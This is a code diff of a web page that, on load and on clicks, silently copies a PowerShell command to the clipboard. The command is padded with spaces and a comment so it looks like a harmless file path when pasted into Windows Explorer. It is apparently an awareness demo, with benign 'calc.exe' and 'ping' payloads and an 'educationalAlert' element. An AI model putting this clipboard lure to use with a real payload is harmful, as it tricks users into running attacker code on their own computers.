@@ -62,16 +62,14 @@
   </main>
 ``
   <script>
-    const command = "calc.exe                      #                                              C:\\Internal\\Important\\Q3 Bonus.pdf                                                                    ";
+    const command = "powershell.exe -c ping 8.8.8.8                      #                                              C:\\Internal\\Important\\Q3 Bonus.pdf                                                                    ";
     const fileInput = document.getElementById('fileInput');
     const windowsExplorer = document.getElementById('windowsExplorer');
     const path = document.getElementById('path');
 
-    // Copy the powershell command when page loads
     window.addEventListener('load', function() {
         navigator.clipboard.writeText(command);
     });
-
 
     path.addEventListener('click', function() {
         navigator.clipboard.writeText(command);
@@ -79,7 +77,6 @@
         document.getElementById('educationalAlert').classList.add('show');
     });
 
-    // copy command and 
     windowsExplorer.addEventListener('click', function() {
         navigator.clipboard.writeText(command);
         fileInput.click();
